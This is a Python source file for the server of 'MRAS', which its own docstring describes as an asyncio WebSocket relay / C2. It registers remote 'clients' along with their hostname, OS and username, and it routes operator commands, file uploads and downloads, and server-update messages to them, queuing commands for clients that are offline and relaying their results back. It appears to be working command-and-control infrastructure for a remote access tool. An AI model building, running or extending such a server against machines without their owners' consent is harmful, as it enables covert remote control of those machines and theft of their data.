"""
MRAS Server — asyncio WebSocket relay / C2.

Auth flow:
  1. Any connection sends AUTH (plain, no cipher yet).
  2. Server verifies token + derives session cipher from salt.
  3. Server sends AUTH_OK encrypted with that cipher.
  4. All subsequent messages on that connection use the cipher.

Routing:
  Admin  → Server (encrypted with admin cipher)
         → Server decrypts, re-encrypts with client cipher → Client
  Client → Server (encrypted with client cipher)
         → Server decrypts, re-encrypts with each admin cipher → Admins
"""
from __future__ import annotations
import asyncio
import json
import logging
import logging.handlers
import os
import sys
import time
from pathlib import Path

import websockets
import yaml

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from shared.crypto import SessionCipher, derive_key
from shared.models import ClientInfo, Message, MessageType, Role
from shared.protocol import decode_message, encode_message
from server.auth import RateLimiter, verify_admin_token, verify_client_token
from server.storage import ClientRegistry

# ── Config ─────────────────────────────────────────────────────────────────

def load_config() -> dict:
    config_path = Path(__file__).parent / "config.yaml"
    with open(config_path) as f:
        cfg = yaml.safe_load(f)
    s = cfg["server"]
    s["secret"] = os.environ.get("MRAS_SECRET", s["secret"])
    s["admin_token"] = os.environ.get("MRAS_ADMIN_TOKEN", s["admin_token"])
    return cfg

# ── Logging ────────────────────────────────────────────────────────────────

def setup_logging(cfg: dict) -> None:
    lc = cfg["logging"]
    Path("logs").mkdir(exist_ok=True)
    level = getattr(logging, lc["level"].upper(), logging.INFO)
    fmt = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
    handlers: list[logging.Handler] = [logging.StreamHandler()]
    fh = logging.handlers.RotatingFileHandler(
        lc["file"], maxBytes=10 * 1024 * 1024, backupCount=5, encoding="utf-8"
    )
    fh.setFormatter(logging.Formatter(fmt))
    handlers.append(fh)
    logging.basicConfig(level=level, format=fmt, handlers=handlers)

log = logging.getLogger("mras.server")

# ── Server state ───────────────────────────────────────────────────────────

registry: ClientRegistry
rate_limiter: RateLimiter
CFG: dict

# ── Helpers ────────────────────────────────────────────────────────────────

async def _send(ws, msg: Message, cipher: SessionCipher | None = None) -> None:
    try:
        await ws.send(encode_message(msg, cipher))
    except Exception as exc:
        log.debug("send error: %s", exc)


async def broadcast_admins(msg: Message) -> None:
    """Forward a message to all admins, each with their own cipher."""
    for ws, cipher in registry.admin_items():
        await _send(ws, msg, cipher)


def _make_cipher(secret: str, salt_hex: str) -> SessionCipher | None:
    if not salt_hex:
        return None
    try:
        salt = bytes.fromhex(salt_hex)
        key, _ = derive_key(secret, salt)
        return SessionCipher(key)
    except Exception:
        return None

# ── Client handler ─────────────────────────────────────────────────────────

async def handle_client(ws, first_raw: str) -> None:
    secret = CFG["server"]["secret"]
    cipher: SessionCipher | None = None
    client_id: str | None = None

    try:
        # --- Auth (first message already read by router) ---
        auth_msg = decode_message(first_raw)   # plain — no cipher yet
        if not auth_msg or auth_msg.type != MessageType.AUTH:
            await _send(ws, Message(MessageType.AUTH_FAIL, {"reason": "expected AUTH"}))
            return

        token = auth_msg.payload.get("token", "")
        if not verify_client_token(token, secret):
            await _send(ws, Message(MessageType.AUTH_FAIL, {"reason": "bad token"}))
            log.warning("Client auth failed from %s", ws.remote_address)
            return

        cipher = _make_cipher(secret, auth_msg.payload.get("salt", ""))
        client_id = auth_msg.payload.get("client_id", f"anon-{id(ws)}")

        info = ClientInfo(
            client_id=client_id,
            hostname=auth_msg.payload.get("hostname", "unknown"),
            os=auth_msg.payload.get("os", "unknown"),
            username=auth_msg.payload.get("username", "unknown"),
            ip=str(ws.remote_address[0]) if ws.remote_address else "unknown",
            connected_at=time.time(),
            last_seen=time.time(),
            version=auth_msg.payload.get("version", "1.0.0"),
        )
        registry.register_client(client_id, info, ws, cipher)

        # AUTH_OK sent with client's cipher so client can verify it can decrypt
        await _send(ws, Message(MessageType.AUTH_OK,
                                {"session": "encrypted" if cipher else "plain"}), cipher)

        # Flush pending commands (re-encrypt with this client's cipher)
        for pending_msg in registry.dequeue_all(client_id):
            await _send(ws, pending_msg, cipher)

        await broadcast_admins(Message(MessageType.CLIENT_CONNECTED, info.to_dict()))
        log.info("Client authenticated: %s", client_id)

        # --- Main loop ---
        async for raw in ws:
            if not rate_limiter.allow(str(id(ws))):
                log.warning("Rate limit hit for client %s", client_id)
                continue

            msg = decode_message(raw, cipher)
            if not msg:
                log.debug("Client %s: failed to decode message", client_id)
                continue

            registry.update_last_seen(client_id, time.time())

            if msg.type == MessageType.PING:
                await _send(ws, Message(MessageType.PONG), cipher)

            elif msg.type in (MessageType.COMMAND_RESULT, MessageType.COMMAND_ERROR,
                              MessageType.FILE_DATA):
                msg.sender_id = client_id
                # Forward result to all admins (each with their own cipher)
                await broadcast_admins(msg)

            else:
                log.debug("Unhandled message from client %s: %s", client_id, msg.type)

    except asyncio.TimeoutError:
        log.warning("Auth timeout for client")
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as exc:
        log.exception("Client handler error: %s", exc)
    finally:
        if client_id:
            registry.unregister_client(client_id)
            await broadcast_admins(
                Message(MessageType.CLIENT_DISCONNECTED, {"client_id": client_id})
            )
        rate_limiter.remove(str(id(ws)))

# ── Admin handler ──────────────────────────────────────────────────────────

async def handle_admin(ws, first_raw: str) -> None:
    secret = CFG["server"]["secret"]
    admin_token = CFG["server"]["admin_token"]
    cipher: SessionCipher | None = None

    try:
        # --- Auth ---
        auth_msg = decode_message(first_raw)   # plain
        if not auth_msg or auth_msg.type != MessageType.AUTH:
            await _send(ws, Message(MessageType.AUTH_FAIL, {"reason": "expected AUTH"}))
            return

        token = auth_msg.payload.get("token", "")
        if not verify_admin_token(token, admin_token):
            await _send(ws, Message(MessageType.AUTH_FAIL, {"reason": "bad admin token"}))
            log.warning("Admin auth failed from %s", ws.remote_address)
            return

        cipher = _make_cipher(secret, auth_msg.payload.get("salt", ""))
        registry.add_admin(ws, cipher)

        await _send(ws, Message(MessageType.AUTH_OK, {"role": "admin"}), cipher)
        log.info("Admin connected from %s", ws.remote_address)

        # Send current client list
        clients = [c.to_dict() for c in registry.list_clients()]
        await _send(ws, Message(MessageType.CLIENT_LIST, {"clients": clients}), cipher)

        # --- Main loop ---
        async for raw in ws:
            if not rate_limiter.allow(f"admin-{id(ws)}"):
                log.warning("Rate limit hit for admin")
                continue

            msg = decode_message(raw, cipher)
            if not msg:
                log.debug("Admin: failed to decode message")
                continue

            if msg.type == MessageType.PING:
                await _send(ws, Message(MessageType.PONG), cipher)

            elif msg.type == MessageType.CLIENT_LIST:
                clients = [c.to_dict() for c in registry.list_clients()]
                await _send(ws, Message(MessageType.CLIENT_LIST,
                                        {"clients": clients}), cipher)

            elif msg.type in (MessageType.COMMAND, MessageType.FILE_UPLOAD,
                              MessageType.FILE_DOWNLOAD, MessageType.UPDATE_SERVERS):
                target_id = msg.target_id
                if not target_id:
                    await _send(ws, Message(MessageType.ERROR,
                                            {"reason": "missing target_id"}), cipher)
                    continue

                client_ws = registry.get_client_ws(target_id)
                client_cipher = registry.get_client_cipher(target_id)

                if client_ws:
                    # Re-encrypt with the client's cipher before forwarding
                    await _send(client_ws, msg, client_cipher)
                    log.info("Routed %s → %s", msg.type.value, target_id)
                else:
                    queued = registry.enqueue(target_id, msg)
                    status = "queued" if queued else "dropped"
                    await _send(ws, Message(MessageType.ERROR, {
                        "reason": f"client {target_id} offline — command {status}",
                        "msg_id": msg.payload.get("msg_id", ""),
                    }), cipher)

            else:
                log.debug("Unhandled admin message: %s", msg.type)

    except asyncio.TimeoutError:
        log.warning("Admin auth timeout")
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as exc:
        log.exception("Admin handler error: %s", exc)
    finally:
        registry.remove_admin(ws)
        rate_limiter.remove(f"admin-{id(ws)}")
        log.info("Admin disconnected")

# ── Router ─────────────────────────────────────────────────────────────────

async def router(ws) -> None:
    """Read the first frame, detect role, dispatch to the right handler."""
    try:
        first_raw = await asyncio.wait_for(ws.recv(), timeout=15)
    except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
        return

    try:
        role = json.loads(first_raw).get("payload", {}).get("role", Role.CLIENT)
    except (json.JSONDecodeError, Exception):
        return

    if role == Role.ADMIN:
        await handle_admin(ws, first_raw)
    else:
        await handle_client(ws, first_raw)

# ── Entry point ────────────────────────────────────────────────────────────

async def main() -> None:
    global registry, rate_limiter, CFG
    CFG = load_config()
    setup_logging(CFG)
    registry = ClientRegistry(max_pending=CFG["server"]["max_pending_commands"])
    rate_limiter = RateLimiter(rate=CFG["server"]["rate_limit_per_second"])

    host = CFG["server"]["host"]
    port = CFG["server"]["port"]
    log.info("MRAS Server starting on %s:%d", host, port)

    async with websockets.serve(router, host, port, ping_interval=20, ping_timeout=30):
        log.info("Server ready.")
        await asyncio.Future()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Server stopped.")
